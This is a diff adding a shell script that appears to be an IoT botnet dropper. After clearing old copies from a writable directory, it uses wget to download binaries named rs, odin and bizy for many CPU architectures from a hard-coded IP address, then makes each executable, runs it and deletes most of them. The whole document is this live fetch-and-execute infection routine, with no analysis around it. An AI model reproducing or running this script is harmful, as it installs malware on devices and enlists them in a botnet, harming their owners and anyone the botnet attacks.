@@ -1,0 +1,46 @@
+#!/bin/sh
+ulimit -n 4096
+ulimit -n 999999
+ulimit -v 2097152
+cd /tmp && 1>.x || cd /var/run && 1>.x || cd /mnt && 1>.x || cd /root && 1>.x || cd / && 1>.x || cd /media && 1>.x
+rm -rf odin*
+rm -rf bizy*
+rm -rf rs*
+rm -rf *.sh
+
+wget http://31.56.209.39/rs.arm; chmod +x rs.arm; ./rs.arm; rm -rf rs.arm
+wget http://31.56.209.39/rs.arm5; chmod +x rs.arm5; ./rs.arm5; rm -rf rs.arm5
+wget http://31.56.209.39/rs.arm6; chmod +x rs.arm6; ./rs.arm6; rm -rf rs.arm6
+wget http://31.56.209.39/rs.arm7; chmod +x rs.arm7; ./rs.arm7; rm -rf rs.arm7
+wget http://31.56.209.39/rs.mips; chmod +x rs.mips; ./rs.mips; rm -rf rs.mips
+wget http://31.56.209.39/rs.mipsle; chmod +x rs.mipsle; ./rs.mipsle; rm -rf rs.mipsle
+wget http://31.56.209.39/rs.mipsSF; chmod +x rs.mipsSF; ./rs.mipsSF; rm -rf rs.mipsSF
+wget http://31.56.209.39/rs.mipsleSF; chmod +x rs.mipsleSF; ./rs.mipsleSF; rm -rf rs.mipsleSF
+wget http://31.56.209.39/rs.x86; chmod +x rs.x86; ./rs.x86; rm -rf rs.x86
+wget http://31.56.209.39/rs.x64; chmod +x rs.x64; ./rs.x64; rm -rf rs.x64
+
+wget http://31.56.209.39/odin.arm; chmod +x odin.arm; ./odin.arm odin.arm.wget
+wget http://31.56.209.39/odin.arm5; chmod +x odin.arm5; ./odin.arm5 odin.arm5.wget
+wget http://31.56.209.39/odin.arm5n; chmod +x odin.arm5n; ./odin.arm5n odin.arm5n.wget
+wget http://31.56.209.39/odin.arm6; chmod +x odin.arm6; ./odin.arm6 odin.arm6.wget
+wget http://31.56.209.39/odin.arm7; chmod +x odin.arm7; ./odin.arm7 odin.arm7.wget
+wget http://31.56.209.39/odin.m68k; chmod +x odin.m68k; ./odin.m68k odin.m68k.wget
+wget http://31.56.209.39/odin.mips; chmod +x odin.mips; ./odin.mips odin.mips.wget
+wget http://31.56.209.39/odin.mpsl; chmod +x odin.mpsl; ./odin.mpsl odin.mpsl.wget
+wget http://31.56.209.39/odin.ppc; chmod +x odin.ppc; ./odin.ppc odin.ppc.wget
+wget http://31.56.209.39/odin.sh4; chmod +x odin.sh4; ./odin.sh4 odin.sh4.wget
+wget http://31.56.209.39/odin.spc; chmod +x odin.spc; ./odin.spc odin.spc.wget
+wget http://31.56.209.39/odin.x64; chmod +x odin.x64; ./odin.x64 odin.x64.wget
+wget http://31.56.209.39/odin.x86; chmod +x odin.x86; ./odin.x86 odin.x86.wget
+
+wget http://31.56.209.39/bizy.arm5; chmod +x bizy.arm5; ./bizy.arm5; rm -rf bizy.arm5
+wget http://31.56.209.39/bizy.arm6; chmod +x bizy.arm6; ./bizy.arm6; rm -rf bizy.arm6
+wget http://31.56.209.39/bizy.arm7; chmod +x bizy.arm7; ./bizy.arm7; rm -rf bizy.arm7
+wget http://31.56.209.39/bizy.arm8; chmod +x bizy.arm8; ./bizy.arm8; rm -rf bizy.arm8
+wget http://31.56.209.39/bizy.mips; chmod +x bizy.mips; ./bizy.mips; rm -rf bizy.mips
+wget http://31.56.209.39/bizy.mpsl; chmod +x bizy.mpsl; ./bizy.mpsl; rm -rf bizy.mpsl
+wget http://31.56.209.39/bizy.mipss; chmod +x ./bizy.mipss; ./bizy.mipss; rm -rf bizy.mipss
+wget http://31.56.209.39/bizy.mpsls; chmod +x ./bizy.mpsls; ./bizy.mpsls; rm -rf bizy.mpsls
+wget http://31.56.209.39/bizy.riscv; chmod +x bizy.riscv; ./bizy.riscv; rm -rf bizy.riscv
+wget http://31.56.209.39/bizy.x86; chmod +x bizy.x86; ./bizy.x86; rm -rf bizy.x86
+wget http://31.56.209.39/bizy.x64; chmod +x bizy.x64; ./bizy.x64; rm -rf bizy.x64
